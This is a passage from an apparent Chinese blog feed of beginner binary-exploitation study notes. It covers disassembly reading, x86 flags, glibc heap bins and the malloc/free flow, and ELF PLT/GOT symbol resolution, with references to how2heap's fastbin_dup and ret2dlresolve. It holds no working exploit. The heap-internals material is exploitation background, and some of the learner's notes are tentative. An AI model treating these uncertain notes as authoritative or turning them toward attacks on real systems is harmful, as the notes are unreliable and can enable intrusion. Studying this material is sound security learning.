class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:000000000000064A                 push    rbp</span><br><span class=\"line\">.text:000000000000064B                 mov     rbp, rsp</span><br><span class=\"line\">.text:000000000000064E                 sub     rsp, 10h</span><br><span class=\"line\">.text:0000000000000652                 mov     [rbp+var_C], 0Ah          ; int i =10</span><br><span class=\"line\">.text:0000000000000659                 mov     [rbp+var_8], 2\t\t\t\t\t\t;int j=2;</span><br><span class=\"line\">.text:0000000000000660                 add     [rbp+var_C], 2\t\t\t\t\t\t; i = i +2;</span><br><span class=\"line\">.text:0000000000000664                 mov     eax, [rbp+var_C]         ; 把i放到eax中当作被除数</span><br><span class=\"line\">.text:0000000000000667                 cdq</span><br><span class=\"line\">.text:0000000000000668                 idiv    [rbp+var_8]              ;j是除数</span><br><span class=\"line\">.text:000000000000066B                 mov     [rbp+var_4], eax         ;结果放到k中</span><br><span class=\"line\">.text:000000000000066E                 mov     ecx, [rbp+var_4]\t\t;k</span><br><span class=\"line\">.text:0000000000000671                 mov     edx, [rbp+var_8]\t\t;j</span><br><span class=\"line\">.text:0000000000000674                 mov     eax, [rbp+var_C]\t\t;i</span><br><span class=\"line\">.text:0000000000000677                 mov     esi, eax\t\t\t\t\t;i</span><br><span class=\"line\">.text:0000000000000679                 lea     rdi, format     ; &quot;this is:%d %d %d\\n&quot;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"识别if语句\"><a href=\"#识别if语句\" class=\"headerlink\" title=\"识别if语句\"></a>识别if语句</h1><p>• if语句的结构 </p>\n<p>​\t– if语句主要由判断语句和跳转语句构成 </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> i = <span class=\"number\">3</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span>(i == <span class=\"number\">3</span>)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    \t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot; this is 3&quot;</span>);</span><br><span class=\"line\">  &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    \t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot; this is not 3&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-16-%E6%B1%87%E7%BC%96%E5%8F%8D%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/image-20230306155253463.png\" alt=\"image-20230306155253463\"></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-16-%E6%B1%87%E7%BC%96%E5%8F%8D%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/image-20230306155311814.png\" alt=\"image-20230306155311814\"></p>\n<h1 id=\"识别循环\"><a href=\"#识别循环\" class=\"headerlink\" title=\"识别循环\"></a>识别循环</h1><p>for和while循环差距不大</p>\n<p>for循环的4个组件 </p>\n<p>​\t– 初始化、比较、执行指令、递增或递减</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> n = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">1</span>;i&lt;<span class=\"number\">101</span>;i++)</span><br><span class=\"line\">    n += i;</span><br><span class=\"line\">  </span><br><span class=\"line\">   <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;the sum is: %d\\n&quot;</span>,n);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-16-%E6%B1%87%E7%BC%96%E5%8F%8D%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/image-20230306160758436.png\" alt=\"image-20230306160758436\"></p>\n<h1 id=\"识别结构体\"><a href=\"#识别结构体\" class=\"headerlink\" title=\"识别结构体\"></a>识别结构体</h1><h1 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h1><p>一开始执行的是什么玩意??</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-14-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%9F%A5%E7%BC%BA%E8%A1%A5%E6%BC%8F1/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-14-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%9F%A5%E7%BC%BA%E8%A1%A5%E6%BC%8F1/",
            "title": "pwn入门-14-基础知识查缺补漏1",
            "date_published": "2023-03-03T11:17:35.000Z",
            "content_html": "<h1 id=\"寄存器\"><a href=\"#寄存器\" class=\"headerlink\" title=\"寄存器\"></a>寄存器</h1><p><img src=\"/pwn%E5%85%A5%E9%97%A8-14-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%9F%A5%E7%BC%BA%E8%A1%A5%E6%BC%8F1/image-20230308133539208.png\" alt=\"image-20230308133539208\"></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-14-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%9F%A5%E7%BC%BA%E8%A1%A5%E6%BC%8F1/image-20230308133315474.png\" alt=\"image-20230308133315474\"></p>\n<h2 id=\"EFLAGS-状态寄存器-32位\"><a href=\"#EFLAGS-状态寄存器-32位\" class=\"headerlink\" title=\"EFLAGS 状态寄存器 32位\"></a>EFLAGS 状态寄存器 32位</h2><p><a href=\"https://article.itxueyuan.com/1DeLA0\">https://article.itxueyuan.com/1DeLA0</a></p>\n<p>​\t\t每一位都是一个标识,置位为1或清除为0</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-14-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%9F%A5%E7%BC%BA%E8%A1%A5%E6%BC%8F1/image-20230308133455659.png\" alt=\"image-20230308133455659\"></p>\n<h3 id=\"几个重要的标志位\"><a href=\"#几个重要的标志位\" class=\"headerlink\" title=\"几个重要的标志位\"></a>几个重要的标志位</h3><p>​\t\t• ZF – 运算结果为0，ZF被置位，否则被清除 </p>\n<p>​\t\t• CF – 结果相对于目标操作数太大或者太小时CF被置位，否则被清除 </p>\n<p>​\t\t• SF – 运算结果为负，或者运算结果最高位为1时，SF被 置位 </p>\n<p>​\t\t• TF – 用于调试，当它被置位时，x86处理器每次只执行一条指令</p>\n<h1 id=\"调用约定\"><a href=\"#调用约定\" class=\"headerlink\" title=\"调用约定\"></a>调用约定</h1><p><img src=\"/pwn%E5%85%A5%E9%97%A8-14-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%9F%A5%E7%BC%BA%E8%A1%A5%E6%BC%8F1/image-20230303213215000.png\" alt=\"image-20230303213215000\"></p>\n<p><a href=\"https://www.codenong.com/10483544/\">https://www.codenong.com/10483544/</a></p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/",
            "title": "pwn入门-13-堆入门基础",
            "date_published": "2023-02-28T10:35:20.000Z",
            "content_html": "<h1 id=\"glibc的堆管理实现\"><a href=\"#glibc的堆管理实现\" class=\"headerlink\" title=\"glibc的堆管理实现\"></a>glibc的堆管理实现</h1><p>arena</p>\n<p>​\t指的是堆内存区域本身,并非结构\t</p>\n<p>​\t主线程的main arena通过sbrk创建</p>\n<p>​\t其他线程arena通过mmap创建</p>\n<p>malloc_state</p>\n<p>​\t管理arena的核心结构,包括堆的状态信息,bins链表等</p>\n<p>​\tmain arena对应的malloc_state结构存储在glibc的全局变量中</p>\n<p>​\t其他线程的arena对应的malloc_state存储在arena本身</p>\n<p>bins</p>\n<p>​\t用来管理空闲内存块,通常使用链表结构来进行组织</p>\n<p>chunks</p>\n<p>​\t内存块的结构</p>\n<h2 id=\"chunks\"><a href=\"#chunks\" class=\"headerlink\" title=\"chunks\"></a>chunks</h2><p>​\t\t用户请求的空间. </p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230531123349377.png\" alt=\"image-20230531123349377\"></p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230228135503733.png\" alt=\"image-20230228135503733\" style=\"zoom:25%;\">\n\n<p>prev_size &#x2F; prev_data： </p>\n<p>• 如果前一个chunk是allocated chunk(P&#x3D;1)，则此字段属于前一个chunk可用的data部分</p>\n<p>• 如果前一个chunk是free chunk(P&#x3D;0)，则此字段表示前一个chunk的size(prev_size)</p>\n<p>标志位（size字段的低3bit） </p>\n<p>• N：NON_MAIN_ARENA flag，表示chunk是否属于主线程</p>\n<p>• M：IS_MMAPPED flag，表示是否由mmap分配</p>\n<p>• P：PREV_INUSE flag，前一个chunk是否处于使用状态</p>\n<p>如果当前chunk已经被free到bin中，</p>\n<p>• fd：指向bin中后一个空闲块的指针</p>\n<p>• bk：指向bin中前一个空闲块的指针</p>\n<p>（后一个和前一个均不一定是物理相邻的）</p>\n<p>如果当前chunk已经被free到large bin（后面马上会提到）中，</p>\n<p>• fd_nextsize：指向large bin中后一个与自己大小不同的chunk的指针</p>\n<p>• bk_nextsize：指向large bin中前一个与自己大小不同的chunk的指针</p>\n<p>大小对齐</p>\n<p>在glibc中，对齐由malloc.c中的request2size宏实现。可以简单将该操作理解为下表中的映射，即：实际size &#x3D; 请求的size+8后对应的下一个0x10对齐的值</p>\n<p>这里应该还考虑了下一个chunk的复用,那万一复用不了呢?</p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230531125219099.png\" alt=\"image-20230531125219099\" style=\"zoom:25%;\">\n\n<h3 id=\"free-chunk\"><a href=\"#free-chunk\" class=\"headerlink\" title=\"free chunk\"></a>free chunk</h3><img src=\"/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230306130932182.png\" alt=\"image-20230306130932182\" style=\"zoom: 33%;\">\n\n<h3 id=\"allocated-chunk\"><a href=\"#allocated-chunk\" class=\"headerlink\" title=\"allocated chunk\"></a>allocated chunk</h3><img src=\"/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230306130712884.png\" alt=\"image-20230306130712884\" style=\"zoom:33%;\">\n\n<p>下一个chunk的prev_size也可以被用来存放数据,因为只有前一个chunk是free的时候这个字段才有意义</p>\n<h1 id=\"案例\"><a href=\"#案例\" class=\"headerlink\" title=\"案例\"></a>案例</h1><p>顺便学一下怎么调试源码</p>\n<p>指定libc版本编译 <a href=\"https://blog.csdn.net/mo4776/article/details/119837501\">https://blog.csdn.net/mo4776/article/details/119837501</a></p>\n<p>-Wl,–dynamic-linker&#x3D;&#x2F;动态连接器的路径&#x2F;ld-linux-x86-64.so.2</p>\n<p><a href=\"https://blog.csdn.net/bandaoyu/article/details/121476940\">https://blog.csdn.net/bandaoyu/article/details/121476940</a></p>\n<p>gcc -Wl,-rpath&#x3D;’&#x2F;my&#x2F;lib’,-dynamic-linker&#x3D;’&#x2F;my&#x2F;lib&#x2F;ld-linux.so.2’</p>\n<p>gcc -Wl,-rpath&#x3D;&#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu3_amd64&#x2F;&#x2F;,–dynamic-linker&#x3D;&#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu3_amd64&#x2F;ld-linux-x86-64.so.2 1.c</p>\n<h1 id=\"各种bin\"><a href=\"#各种bin\" class=\"headerlink\" title=\"各种bin\"></a>各种bin</h1><p>​\tfast bin、tcache bin按照LIFO(last in first out)单链表组织，采用头插法</p>\n<p>​\tunsorted bin、small bin按照FIFO(first in first out)双链表组织，采用头插法</p>\n<p>​\tlarge bin按照双链表组织，插入节点时会保证size从大到小排序</p>\n<p><a href=\"https://blog.51cto.com/u_15076233/3914352\">https://blog.51cto.com/u_15076233/3914352</a></p>\n<p>​\t\t有两种结构来管理,一种是fastbin的,另外一种是其他三种bin的</p>\n<h3 id=\"x2F-Fastbins-x2F-用来管理小的chunk\"><a href=\"#x2F-Fastbins-x2F-用来管理小的chunk\" class=\"headerlink\" title=\"&#x2F;* Fastbins *&#x2F; 用来管理小的chunk\"></a>&#x2F;* Fastbins *&#x2F; 用来管理小的chunk</h3><p>​\t\tmfastbinptr fastbinsY[NFASTBINS];</p>\n<h3 id=\"x2F-Normal-bins-packed-as-described-above-x2F\"><a href=\"#x2F-Normal-bins-packed-as-described-above-x2F\" class=\"headerlink\" title=\"&#x2F;* Normal bins packed as described above *&#x2F;\"></a>&#x2F;* Normal bins packed as described above *&#x2F;</h3><p>​\t\tmchunkptr bins[NBINS * 2 - 2];</p>\n<p>​\t\t• bins：能够存放所有size范围的free chunk，共127个链表节点项，每个链表长度不限。</p>\n<p>​\t\t• bin[0]为unsorted bin  存放未整理的chunk</p>\n<p>​\t\t• bin[2] ~ bin[63]为small bin 管理中等大小的chunk</p>\n<p>​\t\t• bin[64] ~ bin[127]为large bin  存放较大的chunk</p>\n<h2 id=\"fastbin\"><a href=\"#fastbin\" class=\"headerlink\" title=\"fastbin\"></a>fastbin</h2><p>​\t\t将小chunk单独管理(0x20 - 0x80,以0x10为单位,共7个),fd指向它前面那一个 (64位)</p>\n<p>​\t\t使用顺序: <font color=\"red\">先进后出 ,或者说,后进,先出, 头插! </font></p>\n<p>​\t\t靠近fastbinY[]的是头部</p>\n<p>​\t\t释放的时候并不会把p标志置为0</p>\n<p>​\t\t</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230228135750332.png\" alt=\"image-20230228135750332\"></p>\n<p><a href=\"https://kiprey.github.io/2020/04/heap-3-bins/\">https://kiprey.github.io/2020/04/heap-3-bins/</a></p>\n<p>堆命令: vis fastbin</p>\n<p>how2heap 2.23 fastbin的例子<a href=\"https://github.com/shellphish/how2heap/blob/master/glibc_2.23/fastbin_dup.c\">https://github.com/shellphish/how2heap/blob/master/glibc_2.23/fastbin_dup.c</a></p>\n<p>分配完三个0x8大小的堆块后的堆布局,这里有几个细节需要注意.</p>\n<p>1.对齐问题,因为要进行16字节对齐,所以哪怕是分配了8字节,也会给一个16字节的空间,头部是16字节,所以一共32字节</p>\n<p>Malloc(16)也是这样的,malloc(24呢) 也是一样的, 是因为会复用下一个chunk的prev_size吗? 那不复用不就不够了</p>\n<p>这个size是包含了头部的</p>\n<p>那岂不是如果malloc24的话,正好的空间,malloc16的话,会多了8字节可用的空间</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230405104919306.png\" alt=\"image-20230405104919306\"></p>\n<p>后进先出,后面进来的会被挂到头部,可以修改一下代码,释放abc看一下,c是0,b是1,a是2</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230405182425846.png\" alt=\"image-20230405182425846\"></p>\n<h2 id=\"unsorted-bin\"><a href=\"#unsorted-bin\" class=\"headerlink\" title=\"unsorted bin\"></a>unsorted bin</h2><p>​\t\t(除了fastbin外) 被释放的chunk以及把大的chunk分割出来的剩下的chunk,都会先放进这里,目的主要是能让malloc有二次利用最近释放的chunk的机会</p>\n<p>​\t\tunsorted bin只有一个,位于bin[1]中 ???? </p>\n<p>​\t\t无序双向链表,FIFO, 链头插入chunk,链尾取出?? 不对吧 对的,看图,左边是插入,右边是取出</p>\n<p>​\t\tunsorted bin 本身是什么呢? 在哪里?</p>\n<p>​\t\t释放的时候会合并? 什么情况下, 相邻的会合并,(还有其他条件吗?)</p>\n<p>unsortedbin<br>all: 0x5555557591c0 —▸ 0x555555759000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x5555557591c0</p>\n<p>unsortedbin<br>all: 0x555555759380 —▸ 0x5555557591c0 —▸ 0x555555759000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555759380</p>\n<p>左右箭头应该是 fd和bk的意思( 左箭头是值的意思吧)</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230405185946527.png\" alt=\"image-20230405185946527\"></p>\n<h2 id=\"small-bin\"><a href=\"#small-bin\" class=\"headerlink\" title=\"small bin\"></a>small bin</h2><p>​\t\tbin[2] ~ bin[63]为small bin, 管理大小为[0x20, 0x400]的 free chunk,(64位)</p>\n<p>​\t\tsmall bins 中每个 chunk 的大小与其所在的 bin 的 index 的关系为：chunk_size &#x3D; 2 * SIZE_SZ *index，具体如下</p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230405191536275.png\" alt=\"image-20230405191536275\" style=\"zoom:50%;\">\n\n<p>​\t\t16-504B 0x10-0x200</p>\n<p>​\t\t32-1008B 0x20-0x400</p>\n<p>​\t\t索引为<code>2</code>中chunk大小为0x20 - 0x30<br>​\t\t索引为<code>3</code>里的chunk大小为0x30 - 0x40<br>​\t\t<code>......</code><br>​\t\t索引为<code>63</code>里的chunk大小为0x3F0 - <font color=\"red\">0x400</font></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230416162024923.png\" alt=\"image-20230416162024923\"></p>\n<h2 id=\"large-bin\"><a href=\"#large-bin\" class=\"headerlink\" title=\"large bin\"></a>large bin</h2><p>​\t\tbin[64] ~ bin[126]为large bin  存放较大的chunk</p>\n<p>​\t\tlarge bin 大体上分为6大组，其中每个大组里都有若干小组</p>\n<p>​\t\tlarge bins 中一共包括 63 个 bin，每个 bin 中的 chunk 的大小不一致，而是处于一定区间范围内。此外，这 63 个 bin 被分成了 6 组，每组 bin 中的 chunk 大小之间的公差一致，具体如下：</p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230405192532890.png\" alt=\"image-20230405192532890\" style=\"zoom:50%;\">\n\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230401215539966.png\" alt=\"image-20230401215539966\"></p>\n<h2 id=\"tcachebin\"><a href=\"#tcachebin\" class=\"headerlink\" title=\"tcachebin\"></a>tcachebin</h2><p>2.26开始</p>\n<h1 id=\"malloc和free流程\"><a href=\"#malloc和free流程\" class=\"headerlink\" title=\"malloc和free流程\"></a>malloc和free流程</h1><p><a href=\"http://raw.githubusercontent.com/cloudburst/libheap/master/heap.png\">raw.githubusercontent.com&#x2F;cloudburst&#x2F;libheap&#x2F;master&#x2F;heap.png</a></p>\n<h2 id=\"malloc\"><a href=\"#malloc\" class=\"headerlink\" title=\"malloc\"></a>malloc</h2><p>malloc的具体实现可以查看malloc.c中_int_malloc函数，大致流程如下：</p>\n<p>1.将大小按规则对齐，得到实际要分配的大小size</p>\n<p>2.检查size是否符合<strong>tcache bin</strong>的大小。如果是，检查对应size的entry是否有free chunk。如果有，则分配返回</p>\n<p>3.检查size是否符合<strong>fast bin</strong>的大小。如果是，检查对应size的entry是否有free chunk。如果有，则分配返回</p>\n<p>4.循环遍历<strong>unsorted bin</strong>，寻找可用的free chunk</p>\n<p>​\t•  如果遍历到的free chunk size正好和所需size相等，则分配返回</p>\n<p>​\t•  如果遍历到的free chunk size和所需size不等，则将其从双链表中解链(unlink)，插入到对应大小的bins中</p>\n<p>5.根据size，以best-fit的方式，找到相应的<strong>small bin</strong>或者<strong>large bin</strong></p>\n<p>​\t• 对于small bin，如果size正好合适，那么unlink之后，直接将该chunk返回给用户；否则进行切割，剩下的部分重新插入到unsorted bin中。</p>\n<p>​\t• 对于large bin，由于一个bin通常对应几个size，那么根据fd_nextsize的顺序，以size从大到小的顺序遍历chunk，同样采取best-fit的方式寻找合适的chunk，后续行为与small bin类似。</p>\n<p>6.使用<strong>top chunk</strong>，将top chunk进行切割：</p>\n<p>• 如果top chunk size足够，则将切割下来的部分返回，剩下的部分继续作为top chunk</p>\n<p>• 如果top chunk size不够，则需要通过sysmalloc申请更多的堆空间</p>\n<h2 id=\"free\"><a href=\"#free\" class=\"headerlink\" title=\"free\"></a>free</h2><p>free的具体实现可以查看malloc.c中_int_free函数，大致流程如下：</p>\n<ol>\n<li>如果free chunk的size属于<strong>tcache</strong>范围内，且对应大小的tcache bin没有满，则插入到相应的</li>\n</ol>\n<p>tcache bin中去</p>\n<ol>\n<li>如果free chunk的size属于<strong>fast bin</strong>范围内，且对应大小的tcache bin满了，则插入到fastbin</li>\n</ol>\n<p>中去</p>\n<ol>\n<li>如果上述条件均不满足，则通过该chunk的prev_inuse标志位检查是否可以前后向合并：</li>\n</ol>\n<p>• 如果可以合并，则将需要被合并的chunk先unlink下来，合并成一个更大的chunk后再插入到</p>\n<p>unsorted bin中（或合并到top chunk里面）</p>\n<p>• 如果不可以合并，则将该chunk直接插入到unsorted bin中</p>\n<ol>\n<li>free chunk是mmap的chunk，那么调用munmap直接返回给系统</li>\n</ol>\n<h1 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h1><p>ctf-wiki</p>\n<p>datacon训练营</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/",
            "title": "pwn入门-12-pltgot延迟绑定及符号解析",
            "date_published": "2023-02-28T10:22:14.000Z",
            "content_html": "<p>​\t\t2023.7.8更新:很早之前已经写了这篇博客,但是只学了一点皮毛..只在表面,后面学到了ret2dlresolve漏洞发现需要理解这部分东西,又回炉重造,添加了需要学习的更细致的知识</p>\n<h1 id=\"符号解析\"><a href=\"#符号解析\" class=\"headerlink\" title=\"符号解析\"></a>符号解析</h1><h2 id=\"基础知识\"><a href=\"#基础知识\" class=\"headerlink\" title=\"基础知识\"></a>基础知识</h2><p>参考ctfwiki(wiki中是倒推的,感觉理解起来不如正推)</p>\n<p>​\t\t在 ELF 文件中，对于每一个需要重定位的 ELF 节都有对应的重定位表，比如说 .text 节如果需要重定位，那么其对应的重定位表为 .rel.text。 所以.rel.plt就是plt节需要重定位所产生的节了.</p>\n<p>​\t\t.rel.plt中就会包含一个指向这个符号的重定位表项. r_offset给出了要修改的位置,r_info给出了要修改的符号的符号表索引,所以r_info索引到了 .dynsym</p>\n<p>​\t\t.dynsym中,st_name保存着动态符号在dynstr中的偏移</p>\n<p>​\t\t.dynstr又是怎么来的呢? 答:当一个程序导入某个函数时,.dynstr就会包含对应函数名称的字符串(<strong>最后是根据这个字符串名字来进行解析的!!!</strong>)</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/image-20230708162249130.png\" alt=\"image-20230708162249130\"></p>\n<p>以       ret2dl中的例子来说,可以用readelf查看这些节(但在ida中不会显示的这么全,会放到LOAD段里)</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@vultr:~/ret2dl# readelf -S main_partial_relro_32</span><br><span class=\"line\">There are 31 section headers, starting at offset 0x3848:</span><br><span class=\"line\"></span><br><span class=\"line\">Section Headers:</span><br><span class=\"line\">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class=\"line\">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class=\"line\">  [ 1] .interp           PROGBITS        080481b4 0001b4 000013 00   A  0   0  1</span><br><span class=\"line\">  [ 2] .note.gnu.build-i NOTE            080481c8 0001c8 000024 00   A  0   0  4</span><br><span class=\"line\">  [ 3] .note.gnu.propert NOTE            080481ec 0001ec 00001c 00   A  0   0  4</span><br><span class=\"line\">  [ 4] .note.ABI-tag     NOTE            08048208 000208 000020 00   A  0   0  4</span><br><span class=\"line\">  [ 5] .gnu.hash         GNU_HASH        08048228 000228 000020 04   A  6   0  4</span><br><span class=\"line\">  [ 6] .dynsym           DYNSYM          08048248 000248 0000a0 10   A  7   1  4</span><br><span class=\"line\">  [ 7] .dynstr           STRTAB          080482e8 0002e8 00006b 00   A  0   0  1</span><br><span class=\"line\">  [ 8] .gnu.version      VERSYM          08048354 000354 000014 02   A  6   0  2</span><br><span class=\"line\">  [ 9] .gnu.version_r    VERNEED         08048368 000368 000020 00   A  7   1  4</span><br><span class=\"line\">  [10] .rel.dyn          REL             08048388 000388 000018 08   A  6   0  4</span><br><span class=\"line\">  [11] .rel.plt          REL             080483a0 0003a0 000028 08  AI  6  24  4</span><br><span class=\"line\">  [12] .init             PROGBITS        08049000 001000 000024 00  AX  0   0  4</span><br><span class=\"line\">  [13] .plt              PROGBITS        08049030 001030 000060 04  AX  0   0 16</span><br><span class=\"line\">  [14] .plt.sec          PROGBITS        08049090 001090 000050 10  AX  0   0 16</span><br><span class=\"line\">  [15] .text             PROGBITS        080490e0 0010e0 000289 00  AX  0   0 16</span><br><span class=\"line\">  [16] .fini             PROGBITS        0804936c 00136c 000018 00  AX  0   0  4</span><br><span class=\"line\">  [17] .rodata           PROGBITS        0804a000 002000 000008 00   A  0   0  